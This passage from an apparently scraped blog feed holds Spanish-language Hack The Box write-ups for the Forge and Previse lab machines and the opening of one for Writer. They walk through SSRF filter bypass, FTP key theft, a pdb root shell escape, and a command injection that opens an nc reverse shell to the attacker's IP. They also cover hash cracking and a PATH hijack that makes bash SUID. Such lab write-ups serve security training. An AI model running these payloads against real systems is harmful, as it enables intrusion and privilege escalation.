Realizamos una enumeracion al sitio web utilizando feroxbuster, vemos la carpeta \u0026ldquo;uploads\u0026rdquo; donde probablemente se guarden los archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ➜ forge feroxbuster -u http://forge.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://forge.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 4l 24w 224c http://forge.htb/uploads 301 9l 28w 307c http://forge.htb/static 200 33l 58w 929c http://forge.htb/upload 301 9l 28w 314c http://forge.htb/static/images 301 9l 28w 310c http://forge.htb/static/js 403 9l 28w 274c http://forge.htb/server-status Upload Image Utilizamos netcat en el puerto 80 para ver que tipo de informacion obteniamos del servidor, enviando como archivo nuestra direccion IP. De lado de netcat vemos en User-Agent que es una solicitud hecha por medio de la libreria requests de Python.\n1 2 3 4 5 6 7 8 9 ➜ ~ nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.20] from forge.htb [10.10.11.111] 42642 GET /batman.x HTTP/1.1 Host: 10.10.14.20 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Por otro lado vemos un error en la pagina, donde vemos la clase HTTPConnectionPool perteneciente a urllib3.\nAdemás al enviar una solicitud con nuestra direccion IP, se genera una direccion URL.\nAl visitar esta direccion se muestra el contenido de la solicitud, más no se renderiza (a excepcion de imagenes) o ejecuta ningun tipo de archivo, además es una direccion aparentemente temporal, ya que al visitar la direccion nuevamente el contenido ya no existe.\nTambien vemos que las direcciones IP local o al dominio forge.htb estan restringidas.\nSubdomains Utilizamos ffuf para enumerar subdominios, vemos que existe admin.forge.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ➜ forge ffuf -w /usr/share/wordlists/dirb/common.txt -mc 200 -u http://FUZZ.forge.htb /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://FUZZ.forge.htb :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ admin [Status: 200, Size: 27, Words: 4, Lines: 2] ADMIN [Status: 200, Size: 27, Words: 4, Lines: 2] Admin [Status: 200, Size: 27, Words: 4, Lines: 2] :: Progress: [4614/4614] :: Job [1/1] :: 5 req/sec :: Duration: [0:17:00] :: Errors: 4611 :: Aunque al visitar esta direccion se muestra Only localhost is allowed!, utilizando diferentes headers para realizar \u0026ldquo;bypass\u0026rdquo; no permite el acceso.\nSSRF El formulario para subir imagenes tiene restringidas ciertas direcciones. Tras realizar distintas solicitudes y jugar con la url logramos obtener una respuesta que generó una url utilizando una letra mayuscula en la primera letra del dominio (admin.Forge.htb).\nLa url generada muestra el contenido o el index.html del subdominio, donde vemos dos nuevas direcciones (/announcements, /upload).\nEn la direccion /announcements vemos una lista de \u0026ldquo;caracteristicas\u0026rdquo; que perecen ser del subdominio. Se muestran credenciales para el servicio FTP, además la direccion /upload soporta el protocolo ftp(s) y http(s) para subir imagenes que es posible subir imagenes pasando una url en: ?u=[url].\nAnuncios:\n- An internal ftp server has been setup with credentials as user:heightofsecurity123!\r- The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.\r- The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=\u0026lt;url\u0026gt;. FTP Listing La funcionalidad descrita y las credenciales nuevas, nos permitieron acceder al servicio FTP con credenciales en la url lo que nos permitio listar la carpeta principal, donde vemos la flag user.txt y la carpeta snap.\nSegun el formato URL de FTP dice que al enviar una solicitud /%2Fetc/motd el resultado es: acceder a /etc y obtener el archivo motd, de manera \u0026ldquo;similar\u0026rdquo; para //etc/motd. Esto nos permitió obtener la lista de usuarios en /etc/passwd.\nTambien descubrimos que la carpeta donde esta \u0026ldquo;configurado\u0026rdquo; el servicio FTP es en /home/user donde encontramos la carpeta .ssh/ con la clave privada de este usuario.\nUser - Shell Utilizamos la clave privada para acceder por SSH, logrando obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ➜ forge vim user_id_rsa ➜ forge chmod 600 user_id_rsa ➜ forge ssh user@forge.htb -i user_id_rsa # user:heightofsecurity123! Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 13 Sep 2021 11:47:35 PM UTC System load: 0.0 Usage of /: 43.6% of 6.82GB Memory usage: 21% Swap usage: 0% Processes: 220 Users logged in: 0 IPv4 address for eth0: 10.10.11.111 IPv6 address for eth0: dead:beef::250:56ff:feb9:6db0 0 updates can be applied immediately. Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6 user@forge:~$ whoami;id;pwd user uid=1000(user) gid=1000(user) groups=1000(user) /home/user user@forge:~$ ls snap user.txt user@forge:~$ cat user.txt 959589dbea8efb90d8f9d4c2c702c31d user@forge:~$ Privesc Tras ejecutar sudo -l -l vemos que el usuario puede ejecutar el script remote-manage.py.\n1 2 3 4 5 6 7 8 9 10 11 12 13 user@forge:~$ sudo -l -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: Sudoers entry: RunAsUsers: ALL RunAsGroups: ALL Options: !authenticate Commands: /usr/bin/python3 /opt/remote-manage.py Vemos que el script pone a la escucha un puerto random y realiza diferentes acciones o ejecuta comandos tras ingresar la contraseña que se muestra en el codigo. Tambien observamos que utiliza la libreria pdb y, que, ante algun error entra en modo debugging y una shell interactiva pdb. Segun GTFOBins - PDB es posible ejecutar una shell (/bin/sh), para ello debemos de entrar en modo debugging generando algun tipo de error, en este caso vemos que obtiene un numero entero (int()) en las opciones, tras ingresar algun caracter deberia generar el error.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #!/usr/bin/env python3 import socket import random import subprocess import pdb port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((\u0026#39;127.0.0.1\u0026#39;, port)) sock.listen(1) print(f\u0026#39;Listening on localhost:{port}\u0026#39;) (clientsock, addr) = sock.accept() clientsock.send(b\u0026#39;Enter the secret passsword: \u0026#39;) if clientsock.recv(1024).strip().decode() != \u0026#39;secretadminpassword\u0026#39;: clientsock.send(b\u0026#39;Wrong password!\\n\u0026#39;) else: clientsock.send(b\u0026#39;Welcome admin!\\n\u0026#39;) while True: clientsock.send(b\u0026#39;\\nWhat do you wanna do: \\n\u0026#39;) clientsock.send(b\u0026#39;[1] View processes\\n\u0026#39;) clientsock.send(b\u0026#39;[2] View free memory\\n\u0026#39;) clientsock.send(b\u0026#39;[3] View listening sockets\\n\u0026#39;) clientsock.send(b\u0026#39;[4] Quit\\n\u0026#39;) option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput(\u0026#39;ps aux\u0026#39;).encode()) elif option == 2: clientsock.send(subprocess.getoutput(\u0026#39;df\u0026#39;).encode()) elif option == 3: clientsock.send(subprocess.getoutput(\u0026#39;ss -lnt\u0026#39;).encode()) elif option == 4: clientsock.send(b\u0026#39;Bye\\n\u0026#39;) break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit() Tras ejecutar y conectarnos al puerto a la escucha ingresamos un texto lo que permitio que el script pasara a debugging y ejecutando /bin/sh obtener una shell como usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:39646 invalid literal for int() with base 10: b\u0026#39;sckull\u0026#39; \u0026gt; /opt/remote-manage.py(27)\u0026lt;module\u0026gt;() -\u0026gt; option = int(clientsock.recv(1024).strip()) (Pdb) import os; os.system(\u0026#34;/bin/sh\u0026#34;) # whoami root # cd /root # ls clean-uploads.sh root.txt snap # cat root.txt d6c1d34f7e87dae9027b5fe09661245d # cat /home/user/user.txt 959589dbea8efb90d8f9d4c2c702c31d # ","description":"En Forge encontramos una vulnerabilidad SSRF que nos permitió acceder por el servicio FTP donde encontramos una clave privada que nos dio acceso por SSH. Finalmente escalamos privilegios tras la ejecución de un script de python que utiliza PDB, haciendo que este genére un error para obtener una shell como root.","id":38,"section":"posts","tags":["ssrf","ftp","sudo privesc","pdb","python"],"title":"Hack The Box - Forge","uri":"https://sckull.github.io/posts/forge/"},{"content":"\rPrevise presenta un sitio web donde encontramos un backup lo que nos llevó a \u0026lsquo;Command Injection\u0026rsquo;. Obtuvimos acceso a un segundo usuario crackeando el hash de la base de datos del sitio. Finalmente escalamos privilegios modificando la variable PATH.\nNombre Previse OS Linux Puntos 20 Dificultad Facil IP 10.10.11.104 Maker m4lwhere\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.2, 4.7, 4.5, 5.5, 5.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Nmap 7.91 scan initiated Sat Aug 7 20:43:04 2021 as: nmap -Pn -sV -sC -p22,80 -oN scans 10.10.11.104 Nmap scan report for 10.10.11.104 (10.10.11.104) Host is up (0.071s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 7 20:43:15 2021 -- 1 IP address (1 host up) scanned in 11.60 seconds Web Site Descubrimos un formulario de logeo en el puerto 80.\nDirectory Brute Force Realizamos una busqueda de directorios y archivos utilizando feroxbuster con la opcion de -x php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 π ~/htb/previse ❯ feroxbuster -u http://previse.htb -w $MD -x php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://previse.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 302 0l 0w 0c http://previse.htb/download.php 302 112l 263w 4914c http://previse.htb/files.php 200 20l 64w 980c http://previse.htb/header.php 200 31l 60w 1248c http://previse.htb/nav.php 302 71l 164w 2801c http://previse.htb/index.php 200 5l 14w 217c http://previse.htb/footer.php 200 53l 138w 2224c http://previse.htb/login.php 301 9l 28w 308c http://previse.htb/css 302 74l 176w 2966c http://previse.htb/status.php 301 9l 28w 307c http://previse.htb/js 302 0l 0w 0c http://previse.htb/logout.php 302 93l 238w 3994c http://previse.htb/accounts.php 200 0l 0w 0c http://previse.htb/config.php 302 0l 0w 0c http://previse.htb/logs.php 403 9l 28w 276c http://previse.htb/server-status [####################] - 35m 882180/882180 408/s http://previse.htb [\u0026gt;-------------------] - 2m 22292/882180 129/s http://previse.htb/css [\u0026gt;-------------------] - 2m 20476/882180 125/s http://previse.htb/js En la direccion /nav vemos multiples opciones entre ellas Create Account la cual nos redirige hacia /login.php.\nEn Burpsuite vemos que /accounts.php muestra un formulario para crear usuarios.\nwww-data - User Con los parametros del formulario de /accounts.php creamos una solicitud POST con curl agregando los parametros necesarios, con lo que pudimos crear un usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 π ~/htb/previse/backup ❯ curl -s -d \u0026#34;username=sckull\u0026amp;password=sckull\u0026amp;confirm=sckull\u0026#34; -H \u0026#34;Cookie: PHPSESSID=ibuhfb4np5u1v3hq3nccn5cedn\u0026#34; -X POST http://previse.htb/accounts.php |html2text * Home * ACCOUNTS o CREATE_ACCOUNT * FILES * MANAGEMENT_MENU o WEBSITE_STATUS o LOG_DATA * LOG_OUT ***** Add New Account ***** Create new user. ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!! Usernames and passwords must be between 5 and 32 characters! Success! User was added! [username ] [********************] [********************] CREATE USER Created_by_m4lwhere π ~/htb/previse/backup ❯ Web site Tras acceder con las credenciales vemos el estado del servidor de base de datos, numero de usuarios y archivos.\nTambien opcion para delimitar los logs en Log Data.\nWeb site - Backup Una opcion para subir archivos y un archivo .zip vemos en /files.php.\nTras descargar y extraer los archivos, encontramos que es el codigo fuente de la pagina.\n1 2 3 π ~/htb/previse/backup ❯ ls accounts.php config.php download.php file_logs.php files.php footer.php header.php index.php login.php logout.php logs.php nav.php siteBackup.zip status.php π ~/htb/previse/backup ❯ Command Injection Descubrimos que file_logs.php envia el delimitador para los logs hacia logs.php, en este ultimo vemos que es usado como entrada para un script que esta siendo ejecutado por la funcion exec(), además no se muestra ningun tipo de filtro. Con ello sabemos que además del delimitador podriamos enviar un comando para que sea ejecutado despues del script.\n1 2 3 4 5 6 [... REDACTED ...] $output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; [... REDACTED ...] Utilizando Burpsuite enviamos el delimitador comma, interceptamos la solicitud y agregamos la ejecucion de una shell inversa.\n1 delim=comma;nc+-e+/bin/sh+10.10.14.24+1338 Tras enviar la solicitud obtuvimos una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/previse/backup ❯ bash -c \u0026#34;rlwrap nc -lvp 1338\u0026#34; listening on [any] 1338 ... connect to [10.10.14.24] from previse.htb [10.10.11.104] 43816 which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@previse:/var/www/html$ id; whoami; pwd uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data /var/www/html www-data@previse:/var/www/html$ m4lwhere - User Enumeramos el directorio actual y encontramos las credenciales de la base de datos en config.php. Ingresamos y vemos en la base de datos previse el hash de los usuarios registrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 www-data@previse:/var/www/html$ cat config.php cat config.php cat config.php \u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u0026gt; www-data@previse:/var/www/html$ mysql -u root -p Password: mySQL_p@ssw0rd!:) Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 18 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use previse; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; select * from accounts; +----+----------+------------------------------------+---------------------+ | id | username | password | created_at | +----+----------+------------------------------------+---------------------+ | 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | 2 | sckull | $1$🧂llol$RKfwgf0pEP2y8YXlWwK9f1 | 2021-08-08 04:08:35 | +----+----------+------------------------------------+---------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; Crack The Hash Utilizamos John para crackear la contraseña con el wordlist rockyou.txt, tomando en cuenta el emoji que se presenta en el hash ya que tras insertar un nuevo usuario en la base de datos se toma en cuenta el emoji en la creacion del hash.\nbash\rphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/previse ❯ john hash --format=md5crypt-long --wordlist=$ROCK Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:03:05 27.62% (ETA: 22:47:34) 0g/s 22329p/s 22329c/s 22329C/s rubrubs..rubp27 ilovecody112235! (?) 1g 0:00:05:21 DONE (2021-08-07 22:41) 0.003112g/s 23070p/s 23070c/s 23070C/s ilovecodydean..ilovecody.. Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed π ~/htb/previse ❯ cat hash $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. π ~/htb/previse ❯ 1 2 3 4 5 6 7 8 9 10 11 12 13 /* accounts.php */ [... REDACTED ...] $hash = crypt($password, \u0026#39;$1$🧂llol$\u0026#39;); $db = connectDB(); if ($db === false) { die(\u0026#34;ERROR: Could not connect. \u0026#34; . $db-\u0026gt;connect_error); } $sql = \u0026#34;INSERT INTO accounts (username, password) VALUES (\u0026#39;{$username}\u0026#39;,\u0026#39;{$hash}\u0026#39;)\u0026#34;; $result = $db-\u0026gt;query($sql); if ($result) { echo \u0026#39;\u0026lt;div class=\u0026#34;uk-alert-success\u0026#34; uk-alert\u0026gt;\u0026lt;a class=\u0026#34;uk-alert-close\u0026#34; uk-close\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;p\u0026gt;Success! User was added!\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;; } [... REDACTED ...] Shell Ingresamos por SSH con la contraseña encontrada, con ello realizamos la lectura de la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/previse/backup ❯ ssh m4lwhere@previse.htb m4lwhere@previse.htb\u0026#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Aug 8 04:37:54 UTC 2021 System load: 0.08 Processes: 178 Usage of /: 49.2% of 4.85GB Users logged in: 0 Memory usage: 21% IP address for eth0: 10.10.11.104 Swap usage: 0% 0 updates can be applied immediately. Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5 m4lwhere@previse:~$ whoami;id;pwd m4lwhere uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere) /home/m4lwhere m4lwhere@previse:~$ cat user.txt b2156cf5dba3c4171cfaca131061c66e m4lwhere@previse:~$ Privesc Tras ejecutar sudo -l -l vemos que tenemos permisos sudo (root) para ejecutar el script access_backup.sh.\n1 2 3 4 5 6 7 8 m4lwhere@previse:~$ sudo -l -l User m4lwhere may run the following commands on previse: Sudoers entry: RunAsUsers: root Commands: /opt/scripts/access_backup.sh m4lwhere@previse:~$ Dicho script realiza un backup de logs en /var/backups/ con gzip, aunque vemos que el comando no tiene la direccion completa por lo que podriamos crear un archivo con el mismo nombre y con un comando propio.\n1 2 3 4 5 6 7 8 9 10 11 www-data@previse:/opt/scripts$ cat access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz www-data@previse:/opt/scripts$ Editamos la variable $PATH, creamos el archivo gzip, dentro ingresamos un comando para leer la flag root.txt, tras ejecutarlo obtuvimos el contenido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 m4lwhere@previse:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin m4lwhere@previse:~$ export PATH=.:$PATH m4lwhere@previse:~$ echo $PATH .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin m4lwhere@previse:~$ echo \u0026#34;cat /root/root.txt \u0026gt; /home/m4lwhere/root.txt\u0026#34; \u0026gt; gzip \u0026lt;at /root/root.txt \u0026gt; /home/m4lwhere/root.txt\u0026#34; \u0026gt; gzip m4lwhere@previse:~$ chmod +x gzip m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:~$ ls gzip root.txt user.txt m4lwhere@previse:~$ cat root.txt bb3e958df9aef1ada9cf9a2d45e96b8e m4lwhere@previse:~$ Shell Le dimos permisos SUID a bash y con ello obtuvimos una shell como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 m4lwhere@previse:~$ echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt; gzip m4lwhere@previse:~$ ls -lah /bin/bash -rwxr-xr-x 1 root root 1.1M Jun 6 2019 /bin/bash m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:~$ ls -lah /bin/bash -rwsr-xr-x 1 root root 1.1M Jun 6 2019 /bin/bash m4lwhere@previse:~$ /bin/bash -p bash-4.4# whoami; id root uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere) bash-4.4# cd /root bash-4.4# ls -lah total 36K drwx------ 6 root root 4.0K Jul 28 09:11 . drwxr-xr-x 24 root root 4.0K Jul 27 15:04 .. lrwxrwxrwx 1 root root 9 Jun 6 13:01 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.1K Apr 9 2018 .bashrc drwx------ 2 root root 4.0K Jul 26 18:41 .cache drwx------ 3 root root 4.0K Jul 26 18:41 .gnupg drwxr-xr-x 3 root root 4.0K Jul 26 18:41 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -r-------- 1 root root 33 Aug 8 02:04 root.txt drwx------ 2 root root 4.0K Jul 26 18:41 .ssh lrwxrwxrwx 1 root root 9 Jul 28 09:11 .viminfo -\u0026gt; /dev/null bash-4.4# cat root.txt bb3e958df9aef1ada9cf9a2d45e96b8e bash-4.4# ","description":"Previse presenta un sitio web donde encontramos un backup lo que nos llevó a 'Command Injection'. Obtuvimos acceso a un segundo usuario crackeando el hash de la base de datos del sitio. Finalmente escalamos privilegios modificando la variable PATH..","id":39,"section":"posts","tags":["command injection","john","path"],"title":"Hack The Box - Previse","uri":"https://sckull.github.io/posts/previse/"},{"content":"\rEn Writer encontramos una vulnerabilidad \u0026lsquo;SQL Injection\u0026rsquo; que nos permitió obtener el codigo fuente del sitio, para luego realizar \u0026lsquo;Command Injection\u0026rsquo; y acceder a la maquina. Credenciales para la base de datos nos dieron acceso a un siguiente usuario. Por medio de Postfish obtuvimos acceso a un segundo usuario. Finalmente escalamos privilegios utilizando un archivo de configuracion para APT.\nNombre Writer OS Linux Puntos 30 Dificultad Media IP 10.10.11.101 Maker TheCyberGeek\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.8, 5.8, 4.9, 5.1, 4.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 7, 5, 5, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), ssh (22), smb (139, 445).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # Nmap 7.91 scan initiated Tue Aug 10 18:06:55 2021 as: nmap -Pn -sV -sC -p22,80,139,445 -oN scans 10.10.11.101 Nmap scan report for 10.10.11.101 (10.10.11.101) Host is up (0.44s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 